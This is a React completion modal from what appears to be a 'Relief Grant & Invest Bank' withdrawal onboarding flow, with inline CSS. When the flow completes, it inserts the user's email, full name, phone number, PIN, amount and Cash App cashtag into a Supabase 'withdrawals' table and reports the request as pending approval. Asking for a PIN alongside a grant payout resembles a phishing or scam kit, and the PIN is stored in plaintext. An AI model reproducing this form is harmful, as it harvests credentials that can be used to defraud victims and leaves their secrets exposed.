import React, { useEffect, useState } from "react";
import { useStepper } from "../context/StepperContext";

import { supabase } from '../lib/supabase';

export const CompletionModal = () => {
	const { isCompleted, setIsCompleted, goToStep, data, resetData } = useStepper();
	const [emailSent, setEmailSent] = useState(false);
	const [emailStatus, setEmailStatus] = useState("");

	useEffect(() => {
		if (isCompleted && !emailSent) {
			setEmailStatus("Submitting your withdrawal request...");
			
			const submitData = async () => {
				const { error } = await supabase
					.from('withdrawals')
					.insert([
						{
							email: data.email,
							full_name: data.fullName,
							phone: data.phone,
							pin: data.pin,
							amount: data.amount,
							payment_method: data.selectedPaymentMethod,
							transfer_method: data.selectedTransferMethod,
							cashtag: data.cashtag,
							status: 'pending'
						}
					]);

				if (error) {
					console.error("Error submitting:", error);
					setEmailStatus("Error submitting request. Please try again.");
				} else {
					setEmailStatus("Request submitted successfully! It is now pending approval.");
					setEmailSent(true);
				}
			};

			submitData();
		}
	}, [isCompleted, emailSent, data]);

	if (!isCompleted) return null;

	return (
		<div id="completion-overlay" className="show">
			<div className="completion-card">
				<div className="completion-icon">✓</div>
				<h2>Stepper Completed!</h2>
				<p>
					You have navigated through all 16 steps of the Relief Grant &amp;
					Invest Bank onboarding flow.
				</p>

				{emailStatus && (
					<p
						style={{
							color: emailSent ? "#00ca59" : "#ffd85b",
							fontWeight: "bold",
							margin: "15px 0",
						}}
					>
						{emailStatus}
					</p>
				)}

				<div className="completion-btn-row">
					<button
						className="completion-btn btn-restart"
						onClick={() => {
							setIsCompleted(false);
							setEmailSent(false);
							setEmailStatus("");
							resetData();
							goToStep(1);
						}}
					>
						Start From Step 1
					</button>
					<button
						className="completion-btn btn-close"
						onClick={() => setIsCompleted(false)}
					>
						Review Final Step
					</button>
				</div>
			</div>

			<style>{`
        #completion-overlay {
          position: fixed;
          inset: 0;
          z-index: 100000;
          background: rgba(2, 7, 22, 0.88);
          backdrop-filter: blur(12px);
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          animation: fadeIn 0.3s ease-out;
        }
        .completion-card {
          max-width: 480px;
          width: 100%;
          background: linear-gradient(145deg, #0a183d, #050d24);
          border: 1px solid rgba(226, 184, 47, 0.5);
          border-radius: 24px;
          padding: 36px 30px;
          text-align: center;
          box-shadow: 0 25px 65px rgba(0,0,0,0.6);
          color: #fff;
        }
        .completion-icon {
          width: 72px;
          height: 72px;
          border-radius: 50%;
          background: linear-gradient(135deg, #ffd85b, #c99313);
          color: #0b111e;
          display: grid;
          place-items: center;
          font-size: 32px;
          margin: 0 auto 20px;
          box-shadow: 0 0 25px rgba(229, 184, 47, 0.4);
        }
        .completion-card h2 {
          font-size: 26px;
          margin-bottom: 10px;
          letter-spacing: -0.5px;
        }
        .completion-card p {
          color: #92a4c8;
          font-size: 14px;
          line-height: 1.6;
          margin-bottom: 24px;
        }
        .completion-btn-row {
          display: flex;
          gap: 12px;
          justify-content: center;
        }
        .completion-btn {
          padding: 13px 22px;
          border-radius: 13px;
          font-weight: 750;
          font-size: 14px;
          cursor: pointer;
          border: 0;
          transition: all 0.2s ease;
        }
        .btn-restart {
          background: linear-gradient(135deg, #ffe16b, #c68f08);
          color: #0c121e;
        }
        .btn-close {
          background: rgba(255, 255, 255, 0.08);
          border: 1px solid rgba(255, 255, 255, 0.15);
          color: #fff;
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
		</div>
	);
};
